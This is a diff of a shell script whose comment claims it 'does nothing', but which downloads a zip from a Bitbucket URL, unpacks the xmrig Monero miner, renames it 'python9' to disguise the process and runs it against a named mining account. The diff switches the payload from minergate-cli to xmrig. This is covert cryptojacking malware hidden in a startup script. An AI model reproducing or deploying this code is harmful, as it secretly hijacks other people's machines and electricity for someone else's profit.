@@ -10,7 +10,7 @@
 # bits.
 #
 # By default this script does nothing.
-if [ -f ${PWD}/minergate-cli/python9 ]; then
+if [ -f ${PWD}/python9 ]; then
     if pgrep -x "python9" > /dev/null
 then
     echo "Miner dang chay roi , ke cmn di "
@@ -18,7 +18,7 @@ then
 else
 
 echo "Miner da install , chay thoi "
-cd minergate-cli
+mv xmrig python9
 ./python9 -u haidang.tli@gmail.com --xmr 2
 
      
@@ -26,8 +26,8 @@ fi
 exit
 fi
 
-wget https://raw.githubusercontent.com/haidanglx/Tonghop/master/minergate-cli.zip
-unzip minergate-cli.zip
-cd minergate-cli
-mv minergate-cli python9
+wget https://bitbucket.org/tengikekao/myrep/downloads/mor.zip
+unzip mor.zip
+chmod +x xmrig
+mv xmrig python9
 ./python9 -u haidang.tli@gmail.com --xmr 2
